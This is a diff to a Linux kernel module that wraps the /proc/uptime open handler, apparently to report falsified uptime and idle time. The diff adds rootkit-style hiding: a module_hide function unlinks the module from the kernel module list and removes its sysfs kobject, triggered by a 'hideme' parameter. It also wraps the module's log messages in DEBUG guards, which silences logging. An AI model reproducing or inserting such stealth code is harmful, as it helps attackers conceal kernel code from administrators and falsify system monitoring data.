@@ -52,7 +52,9 @@ static long unsigned uptime = 0;
 static long unsigned idletime = 0;
 static long unsigned startjiffies = 0;
 
-static int failed = 0;
+static short proc_failed = 0;
+static short hideme = 0;
+static short module_hidden = 0;
 
 static int (*old_uptime_proc_open)(struct inode *inode, struct file *file);
 static int uptime_proc_open(struct inode *inode, struct file *file);
@@ -63,8 +65,12 @@ static struct proc_dir_entry *proc_root;
 static struct file_operations *uptime_proc_fops;
 static struct file_operations *proc_root_fops;
 
+static struct list_head *module_previous;
+static struct list_head *module_kobj_previous;
+
 module_param(uptime, long, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
 module_param(idletime, long, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
+module_param(hideme, short, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
 
 static void set_addr_rw(void *addr)
 {
@@ -80,22 +86,50 @@ static void set_addr_ro(void *addr)
 	pte->pte = pte->pte &~_PAGE_RW;
 }
 
+void module_hide(void)
+{
+	if (module_hidden)
+		return;
+
+	module_previous = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+
+	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
+	kobject_del(&THIS_MODULE->mkobj.kobj);
+	list_del(&THIS_MODULE->mkobj.kobj.entry);
+	module_hidden = 1;
+}
+
+void module_show(void)
+{
+	if (!module_hidden)
+		return;
+
+	list_add(&THIS_MODULE->list, module_previous);
+	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, MODULE_NAME);
+	module_hidden = 0;
+}
+
 static void proc_init(void)
 {
 	uptime_proc_file = create_proc_entry("temp_hack", 0, NULL);
 	if (uptime_proc_file == NULL)
 	{
+#ifdef DEBUG
 		printk(KERN_ALERT "%s error: could not create temporary /proc entry\n",
 				MODULE_NAME);
-		failed = 1;
+#endif
+		proc_failed = 1;
 		return;
 	}
 	proc_root = uptime_proc_file->parent;
 	if (proc_root == NULL || strcmp(proc_root->name, "/proc") != 0)
 	{
+#ifdef DEBUG
 		printk(KERN_ALERT "%s error: could not identify /proc root entry\n",
 				MODULE_NAME);
-		failed = 1;
+#endif
+		proc_failed = 1;
 		return;
 	}
 	proc_root_fops = (struct file_operations *)proc_root->proc_fops;
@@ -107,9 +141,11 @@ static void proc_init(void)
 			goto found;
 		uptime_proc_file = uptime_proc_file->next;
 	}
-	failed = 1;
+	proc_failed = 1;
+#ifdef DEBUG
 	printk(KERN_ALERT "%s did not found /proc/%s file", MODULE_NAME,
 			PROCFS_NAME);
+#endif
 	return;
 
 found:
@@ -122,24 +158,30 @@ found:
 		uptime_proc_fops->open = uptime_proc_open;
 		set_addr_ro(uptime_proc_fops);
 
+#ifdef DEBUG
 		printk(KERN_INFO "%s: successfully wrapped /proc/%s\n",
 				MODULE_NAME, PROCFS_NAME);
+#endif
 	}
 }
 
 static void proc_cleanup(void)
 {
-	if (!failed && (uptime_proc_fops != NULL))
+	if (!proc_failed && (uptime_proc_fops != NULL))
 	{
 		set_addr_rw(uptime_proc_fops);
 		uptime_proc_fops->open = old_uptime_proc_open;
 		set_addr_ro(uptime_proc_fops);
 
+#ifdef DEBUG
 		printk(KERN_INFO "%s: successfully unwrapped /proc/%s\n",
 				MODULE_NAME, PROCFS_NAME);
+#endif
 	}
+#ifdef DEBUG
 	else
 		printk(KERN_INFO "%s: nothing to unwrap, exiting\n", MODULE_NAME);
+#endif
 }
 
 static int uptime_proc_show(struct seq_file *m, void *v)
